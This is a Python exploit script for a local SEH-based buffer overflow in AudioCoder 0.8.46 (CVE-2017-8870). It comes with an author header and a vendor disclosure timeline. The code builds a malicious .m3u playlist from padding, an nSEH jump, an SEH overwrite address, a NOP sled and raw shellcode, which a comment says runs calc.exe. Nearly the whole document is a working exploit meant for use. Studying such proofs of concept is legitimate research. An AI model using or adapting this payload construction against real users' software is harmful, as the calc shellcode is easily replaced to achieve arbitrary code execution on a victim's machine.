#!/usr/bin/python
# Exploit Title      : AudioCoder 0.8.46 Local Buffer Overflow (SEH)
# CVE				 : CVE-2017-8870
# Exploit Author     : Muhann4d @0xSecured
# Vendor Homepage    : http://www.mediacoderhq.com
# Vulnerable Software: http://www.mediacoderhq.com/getfile.htm?site=mediatronic.com.au/download&file=AudioCoder-0.8.46.exe
# Vulnerable Version : 0.8.46
# Fixed version      : N/A
# Category           : Local Buffer Overflow
# Tested on OS       : Windows 7 Pro SP1 32bit
# How to             : Open AudioCoder then drag & drop the .m3u file in it and then press the START button.
# Timeline 	: 
# 2017-05-05: Vulnerability discovered, vendor has been contaced
# 2017-05-08: Vendor replied denying it .."I believe this was an old issue and no longer exists in the latest version" 
# 2017-05-09: A POC sent to the vendor. No reply since then.
# 2017-06-26: Exploit released.
 
print "AudioCoder 0.8.46 Local Buffer Overflow By Muhann4d @0xSecured"
from struct import pack

junk = "http://" + "\x41" * 741
nseh = pack('<I',0x909006eb)
seh = pack('<I',0x66015926)
nops= "\x90" * 20
shell=("\xb8\x9d\x01\x15\xd1\xda\xd2\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x32\x31\x42\x12\x03\x42\x12\x83\x77\xfd\xf7\x24\x7b\x16\x7e"
"\xc6\x83\xe7\xe1\x4e\x66\xd6\x33\x34\xe3\x4b\x84\x3e\xa1\x67"
"\x6f\x12\x51\xf3\x1d\xbb\x56\xb4\xa8\x9d\x59\x45\x1d\x22\x35"
"\x85\x3f\xde\x47\xda\x9f\xdf\x88\x2f\xe1\x18\xf4\xc0\xb3\xf1"
"\x73\x72\x24\x75\xc1\x4f\x45\x59\x4e\xef\x3d\xdc\x90\x84\xf7"
"\xdf\xc0\x35\x83\xa8\xf8\x3e\xcb\x08\xf9\x93\x0f\x74\xb0\x98"
"\xe4\x0e\x43\x49\x35\xee\x72\xb5\x9a\xd1\xbb\x38\xe2\x16\x7b"
"\xa3\x91\x6c\x78\x5e\xa2\xb6\x03\x84\x27\x2b\xa3\x4f\x9f\x8f"
"\x52\x83\x46\x5b\x58\x68\x0c\x03\x7c\x6f\xc1\x3f\x78\xe4\xe4"
"\xef\x09\xbe\xc2\x2b\x52\x64\x6a\x6d\x3e\xcb\x93\x6d\xe6\xb4"
"\x31\xe5\x04\xa0\x40\xa4\x42\x37\xc0\xd2\x2b\x37\xda\xdc\x1b"
"\x50\xeb\x57\xf4\x27\xf4\xbd\xb1\xd8\xbe\x9c\x93\x70\x67\x75"
"\xa6\x1c\x98\xa3\xe4\x18\x1b\x46\x94\xde\x03\x23\x91\x9b\x83"
"\xdf\xeb\xb4\x61\xe0\x58\xb4\xa3\x83\x3f\x26\x2f\x44")
#calc.exe

junkD = "D" * (2572 - (len(junk + nseh + seh + nops + shell)))
exploit = junk + nseh + seh + nops + shell + junkD
  
try:
    file= open("Exploit.m3u",'w')
    file.write(exploit)
    file.close()
    raw_input("\nExploit has been created!\n")
except:
    print "There has been an Error"